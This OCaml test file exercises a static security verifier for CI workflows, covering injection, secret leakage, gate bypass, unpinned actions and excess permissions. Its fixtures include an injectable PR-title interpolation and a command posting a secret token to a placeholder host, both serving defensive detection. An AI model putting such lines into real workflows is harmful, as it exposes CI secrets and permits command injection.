type test = string * (unit -> unit)

exception Failed of string

let fail format = Printf.ksprintf (fun value -> raise (Failed value)) format
let expect message condition = if not condition then fail "%s" message

let value ?(trust = Abstract_value.Trusted) ?(secrecy = Abstract_value.Public)
    text =
  Abstract_value.string_constant text ~trust ~secrecy
    ~provenance:[ { origin = "fixture"; span = Span.none; operation = "test" } ]

let node ?(kind = Ir.Command) ?(phase = Ir.Run) ?(attributes = [])
    ?(capabilities = []) ?(effects = []) ?unknown name =
  Ir.make_node ~provider:Ir.Github ~kind ~name ~phase ~span:Span.none
    ~attributes ~capabilities ~effects ?unknown ()

let graph (nodes : Ir.node list) (edges : Ir.edge list)
    (entrypoints : Ir.node list) =
  List.fold_left
    (fun graph (node : Ir.node) -> Ir.add_node node graph)
    (Ir.empty Ir.Github "fixture.yml")
    nodes
  |> fun graph ->
  List.fold_left (fun graph edge -> Ir.add_edge edge graph) graph edges
  |> fun graph ->
  List.fold_left
    (fun graph (node : Ir.node) -> Ir.add_entrypoint node.id graph)
    graph entrypoints
  |> Ir.finalize

let edge ?(kind = Ir.Control) (from_ : Ir.node) (to_ : Ir.node) =
  Ir.make_edge ~kind ~from_:from_.id ~to_:to_.id ()

let has_rule rule result =
  List.exists
    (fun diagnostic -> diagnostic.Diagnostic.rule_id = rule)
    result.Verifier.diagnostics

let property rule result =
  match
    List.find_opt
      (fun property -> property.Property.id = rule)
      result.Verifier.properties
  with
  | Some value -> value
  | None -> fail "missing property %s" rule

let injection_triple_test () =
  let unsafe_command =
    node
      ~attributes:
        [
          ( "command",
            value ~trust:Abstract_value.Untrusted
              "echo ${{ github.event.pull_request.title }}" );
        ]
      ~capabilities:[ Ir.Shell ] "unsafe shell"
  in
  let unsafe_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ unsafe_command ] [] [ unsafe_command ])
  in
  expect "untrusted command interpolation must violate injection property"
    ((property "WV-SEC-001" unsafe_result).state = Property.Violated);
  expect "violation must emit a diagnostic"
    (has_rule "WV-SEC-001" unsafe_result);
  let diagnostic =
    List.find
      (fun item -> item.Diagnostic.rule_id = "WV-SEC-001")
      unsafe_result.diagnostics
  in
  expect "diagnostic needs a source-to-command trace" (diagnostic.trace <> []);
  expect "shell is part of the minimal exploit capability set"
    (List.mem Ir.Shell diagnostic.capabilities);

  let safe_command =
    node
      ~attributes:[ ("command", value "printf '%s' \"$TITLE\"") ]
      ~capabilities:[ Ir.Shell ] "quoted env"
  in
  let safe_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ safe_command ] [] [ safe_command ])
  in
  expect "trusted command must prove injection property"
    ((property "WV-SEC-001" safe_result).state = Property.Proved);

  let unknown_command =
    node
      ~attributes:
        [
          ( "command",
            Abstract_value.unknown (Unknown.Dynamic_string "generated script")
          );
        ]
      ~capabilities:[ Ir.Shell ] "dynamic shell"
  in
  let unknown_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ unknown_command ] [] [ unknown_command ])
  in
  match (property "WV-SEC-001" unknown_result).state with
  | Property.Unknown reasons ->
      expect "Unknown must retain a reason" (reasons <> [])
  | _ -> fail "dynamic command must remain Unknown"

let secret_network_test () =
  let command =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret
              "curl -d $TOKEN https://example.invalid" );
        ]
      ~capabilities:[ Ir.Shell; Ir.Network; Ir.Secret_access ]
      "upload"
  in
  let result =
    Verifier.verify ~persona:Verifier.Gate (graph [ command ] [] [ command ])
  in
  expect "secret sent by a network command must be found"
    (has_rule "WV-SEC-002" result);
  let finding =
    List.find
      (fun item -> item.Diagnostic.rule_id = "WV-SEC-002")
      result.diagnostics
  in
  expect "minimal set includes network and secret access"
    (List.mem Ir.Network finding.capabilities
    && List.mem Ir.Secret_access finding.capabilities)

let dominance_test () =
  let workflow = node ~kind:Ir.Workflow ~phase:Ir.Compile "workflow"
  and gate = node ~kind:Ir.Gate ~phase:Ir.Plan "environment approval"
  and deploy =
    node ~kind:Ir.Effect ~effects:[ Ir.Deployment_change ]
      ~capabilities:[ Ir.Deployment ] "deploy"
  in
  let safe =
    graph [ workflow; gate; deploy ]
      [ edge workflow gate; edge gate deploy ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "approval gate dominates deployment"
    ((property "WV-AUTH-001" safe).state = Property.Proved);
  let bypass =
    graph [ workflow; gate; deploy ]
      [ edge workflow gate; edge gate deploy; edge workflow deploy ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "a bypass path violates authorization dominance"
    ((property "WV-AUTH-001" bypass).state = Property.Violated);
  expect "bypass produces a deterministic witness"
    (has_rule "WV-AUTH-001" bypass)

let supply_chain_and_permission_test () =
  let workflow =
    node ~kind:Ir.Workflow ~phase:Ir.Compile
      ~capabilities:[ Ir.Repository_write; Ir.Token_write ]
      "workflow"
  and call =
    node ~kind:Ir.Call ~phase:Ir.Run
      ~unknown:(Unknown.Unresolved_dependency "actions/checkout@v4")
      "actions/checkout@v4"
  in
  let result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ workflow; call ] [ edge workflow call ] [ workflow ])
  in
  expect "mutable action tag must be diagnosed"
    (has_rule "WV-SUPPLY-001" result);
  expect "unused write grants must be diagnosed" (has_rule "WV-PERM-001" result)

let script_adapter_test () =
  let cases =
    [
      (Script_adapter.Bash, "curl https://example.invalid");
      (Script_adapter.PowerShell, "Invoke-WebRequest https://example.invalid");
      (Script_adapter.Cmd, "curl.exe https://example.invalid");
      (Script_adapter.Python, "requests.post(url, data=token)");
    ]
  in
  List.iter
    (fun (shell, source) ->
      let summary = Script_adapter.analyze shell source in
      expect "network effect must be recognized across script adapters"
        (List.mem Ir.Network_request summary.effects))
    cases;
  let quoted =
    Script_adapter.analyze Script_adapter.Bash "printf '%s' \"$TITLE\""
  in
  expect "tokenizer must retain quoted expansion context"
    (List.exists (fun token -> token.Script_adapter.quoted) quoted.tokens)

let github_end_to_end_test () =
  let path = Filename.concat (Sys.getcwd ()) "fixtures/github/workflow.yml" in
  let source =
    match Util.read_file path with
    | Ok value -> value
    | Error error -> fail "%s" error
  in
  let compilation =
    match Frontend.compile_string ~provider:Ir.Github ~path ~source () with
    | Ok value -> value
    | Error _ -> fail "GitHub fixture did not compile"
  in
  let result = Verifier.verify ~persona:Verifier.Gate compilation.graph in
  List.iter
    (fun rule -> expect ("end-to-end missing " ^ rule) (has_rule rule result))
    [ "WV-SEC-001"; "WV-SEC-002"; "WV-SUPPLY-001"; "WV-PERM-001" ]

let tests : test list =
  [
    ("injection has violated proved and unknown states", injection_triple_test);
    ("secret to network yields minimal capabilities", secret_network_test);
    ("authorization gates must dominate privileged effects", dominance_test);
    ( "supply chain and least privilege share the graph",
      supply_chain_and_permission_test );
    ("script adapters infer effects and quote boundaries", script_adapter_test);
    ( "GitHub frontend feeds whole-program security analysis",
      github_end_to_end_test );
  ]

let () =
  let failures = ref 0 in
  List.iter
    (fun (name, run) ->
      try
        run ();
        Printf.printf "ok - %s\n%!" name
      with
      | Failed message ->
          incr failures;
          Printf.eprintf "not ok - %s: %s\n%!" name message
      | error ->
          incr failures;
          Printf.eprintf "not ok - %s: unexpected %s\n%!" name
            (Printexc.to_string error))
    tests;
  if !failures > 0 then exit 1
